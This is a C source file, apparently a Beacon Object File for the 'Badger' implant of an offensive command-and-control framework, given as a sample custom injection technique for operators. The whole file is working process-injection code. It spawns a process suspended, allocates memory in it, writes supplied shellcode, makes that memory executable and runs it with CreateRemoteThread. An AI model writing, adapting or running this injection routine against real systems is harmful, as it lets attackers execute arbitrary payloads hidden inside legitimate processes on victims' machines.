// NOTE: THIS IS A QUICK SAMPLE OF USING CUSTOM INJECTION
// TECHNIQUES WITH BOFS. OPERATORS CAN WRITE THEIR OWN
// INJECTION TECHNIQUES HERE IN C AND FILE ARGS CAN BE 
// PROVIDED TO THIS CODE USING THE 'SET_COFFARGS' COMMAND
// THIS EXAMPLE SPAWNS NOTEPAD AND INJECTS A SHELLCODE
// INTO THE PROCESS USING THIS BOF. THE SHELLCODE FILE IS
// PROVIDED TO THE BOF USING THE 'SET_COFFARGS' COMMAND

#include <windows.h>
#include <stdio.h>
#include "badger_exports.h"

// the arguments set using the 'set_coffargs' will always be passed on as the
// first arguments to the coffexec commands. the manually passed arguments
// in the console will be passed on as subsequent commands

WINADVAPI WINAPI BOOL Kernel32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
WINADVAPI WINAPI LPVOID Kernel32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
WINADVAPI WINAPI BOOL Kernel32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WINADVAPI WINAPI BOOL Kernel32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
WINADVAPI WINAPI HANDLE Kernel32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

void coffee(char** argv, int argc, WCHAR** dispatch) {
    STARTUPINFOA sinfo = { 0 };
    sinfo.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pinfo = { 0 };
    SIZE_T bytesWritten = 0;
    LPVOID addressPointer = 0;
    DWORD flOldProtect = 0;
    DWORD threadID = 0;

    if (argc == 2) {
        if (Kernel32$CreateProcessA(NULL, argv[1], NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo)) {
            BadgerDispatch(dispatch, "[+] Process Created: %lu\n", pinfo.dwProcessId);
            ULONG bufferSize = BadgerGetBufferSize(argv[0]);
            BadgerDispatch(dispatch, "[+] Buffer Size: %llu\n", bufferSize);
            addressPointer = Kernel32$VirtualAllocEx(pinfo.hProcess, NULL, bufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (addressPointer) {
                BadgerDispatch(dispatch, "[+] Shellcode RX: %p\n", addressPointer);
                if (Kernel32$WriteProcessMemory(pinfo.hProcess, addressPointer, argv[0], bufferSize, &bytesWritten)) {
                    BadgerDispatch(dispatch, "[+] Bytes written: %lu\n", bytesWritten);
                    if (Kernel32$VirtualProtectEx(pinfo.hProcess, addressPointer, bufferSize, PAGE_EXECUTE_READ, &flOldProtect)) {
                        HANDLE hThread = Kernel32$CreateRemoteThread(pinfo.hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, &threadID);
                        if (hThread) {
                            BadgerDispatch(dispatch, "[+] Thread Created: %lu\n", threadID);
                        }
                    }
                }
            }
        }
    } else {
        BadgerDispatch(dispatch, "[+] Need 2 arguments:\n1. shellcode bin file\n2. process2inject\n");
    }
}